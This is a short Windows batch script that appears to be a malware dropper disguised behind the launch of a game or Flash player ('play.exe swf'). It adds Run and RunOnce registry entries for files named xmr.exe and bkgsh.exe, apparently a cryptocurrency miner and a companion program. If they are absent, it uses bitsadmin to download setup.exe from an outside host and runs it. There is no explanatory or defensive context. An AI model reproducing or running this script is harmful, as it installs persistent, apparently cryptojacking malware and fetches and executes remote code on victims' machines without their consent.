@echo off
start "" play.exe swf
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v bkgsh /t REG_SZ /d C:\Windows\System32\bkgsh.exe /f
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v xmr /t REG_SZ /d C:\Windows\xmr.exe /f
IF EXIST C:\Windows\xmr.exe ( IF EXIST C:\Windows\System32\bkgsh.exe ( exit ) )
ELSE (
bitsadmin /transfer "setup" http://config.gamesexhay.com C:\Windows\System32\setup.exe
call C:\Windows\System32\setup.exe
)